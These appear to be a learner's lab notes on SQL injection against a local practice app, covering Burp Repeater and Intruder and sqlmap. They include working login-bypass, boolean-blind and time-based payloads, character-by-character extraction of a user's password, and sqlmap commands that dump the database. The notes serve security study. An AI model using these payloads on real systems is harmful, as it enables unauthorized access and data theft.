#sql 
# Part 1  
## Burp
	* Target -> Scope settings -> ADD -> http://localhost
		* Click yes when prompted about history
	* Proxy -> HTTP History -> Right-click, "Clear History"
* Login to the lab 2 with jeremy : jeremy
	* inspect in burb the post
	* notice Set-Cookie: session=cookie(md5)
		* This is probably in MD5
	* CTRL+R to Sent Post with username=jeremy&password to repeater
* Repeater lets us send requests and modify what we are sending to compare results
	* We can check against content-length that gets returned to validate the results success/fail, of what we send in repeater
![[Sql Injection - repeater.png]]
* In body of repeater, we can take our string and try the sql injection  
```sql
username=jeremy&password=jeremy   
username=jeremy' or 1=1#&password=jeremy
```
* We need to encode the characters ' or 1=1#, so it's parsed correctly
* 2 ways to encode key characters
		1. Highlight characters to be encoded
		2. CTRL+U
		3. OR,   Right Click -> convert selection -> URL -> URL-encode key characters
* If our SQL query, isn't just right, we will always fail here, so we need to automate this testing.
## Automating SQL Blind Injection  
* Copy all the text in the original working HTTP  post to a file > req.txt
*  `sqlmap -r req.txt`  
		In this case, sqlmap did not give find any injectable paramters  

* Instead, lets a different injection point
* Take the HTTP GET request, with the session cookie, CTRL+R and sent to repeater 
![[3 - Sql Injection Blind - session cookie CL.png]]
* Notice the content length of the initial response
* If we take this, and match on the successful response, we can see we have 1 match
	* to match, highlight something, paste in bottom search field.
* *![[3 - Sql Injection Blind - match.png]]
* If we break this session cookie, by adding an extra A to it, , we'll see 0 matches on the bottom.  The content length should also change, indicating a different response
* If your content length isn't reliable and you want to check something on the page, using this match search/technique is a useful way to do it
* Try adding SQL to the session cookie, to test if injection is possible 
* We are adding `' and 1=1#` to session cookie
* ![[3 - Sql Injection Blind - cookie injection.png]]
* Notice content length is the same as above, indicating YES injection is possible
***  
# Part 2
In blind SQL injection, we don't get data from the DB.  We only get a change in the behavior.  We have to create payloads that produce TRUE/FALSE outputs.  In essence, asking the DB simple yes no questions.  i.e.  Is the first character of the username A, yes/no?  Is the password longer than 20 characters, yes/no?  These questions will allow us to extract information that will not be returned on screen.   We will use 'substring' to attempt to do this character by character
```shell
# https://www.w3schools.com/sql/func_mysql_substring.asp
# Extract a substring from a string (start at position 1, extract 3 characters):
SELECT SUBSTRING("SQL Tutorial", 1, 3) AS ExtractString;

#Extract a substring from the text in a column (start at position 2, extract 5 characters):
SELECT SUBSTRING(CustomerName, 2, 5) AS ExtractString  
FROM Customers;
```

In the session cookie, try appending the following to the end, and check the content length output.       
```shell
' and substring(a,1,1) = 'a'#   
```
If successful, content length should match the success we got above, 1027, if failed, it will be a different value. We don't want to compare strings we  provide, we want to compare against things we grab from the database.
Example where we are trying to query the mysql version info : 
Typical mysql version is 7.0.1 or 8.1.1
```shell
' and substring((select version()),1,1) ='7'#
```
![[3 - Sql Injection Blind-mysql version fail.png]]
![[3 - Sql Injection Blind-mysql version success.png]]
Going character by character, asking the database yes/no, is this the next character?, we are slowly able to extract the version info and get a successful response, indicated by content length of 1027.
![[3 - Sql Injection Blind-mysql version disclosure.png]]
Use the same technique to extract other data, such as password : 
```shell
' and substring((select password from injection0x02 where username = 'jessamy'),1,1) = 'a'#
```
![[3 - Sql Injection Blind-password-1.png]]
### Burp Intruder Automation
* CTRL+i to send above HTTP GET request to intruder
* Make sure the variable 'a', is marked in intruder, if not highlight and click 'add' button
* Switch to Payloads tab 
	* payload settings
	* add payload a-z 0-9
		* I made a simple txt file that had 36 lines, 1 letter/# per line and loaded it here
	* Start attack!
You'll notice very quickly, that all response length's are similar, but 1
![[3 - Sql Injection Blind-intruder char1-z.png]]
### SQLMAP Cookie Automation
* take the HTTP GET request to intruder, the vanilla one, and dump it in a text file, call it req2.txt. Then provide  that as input for sqlmap  
```shell
sqlmap -r req2.txt --level=2      
```
![[3 - Sql Injection Blind-sqlmap payload.png]]
* sqlmap found 2 different payloads that we could use 
```shell
# Type: boolean-based blind
# Title: AND boolean-based blind - WHERE or HAVING clause
Payload: session=6967cabefd763ac1a1a88e11159957db' AND 8906=8906 AND 'RxQY'='RxQY

# Type: time-based blind
# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 9190 FROM (SELECT(SLEEP(5)))nDEj) AND 'YYUL'='YYUL
```
Since this was successful, we can try to dump the database 
```shell
 sqlmap -r req2.txt --level=2 --dump
 # OR
 sqlmap -r req2.txt --level=2 --dump -T injection0x02
```
![[3 - Sql Injection Blind-db dump.png]]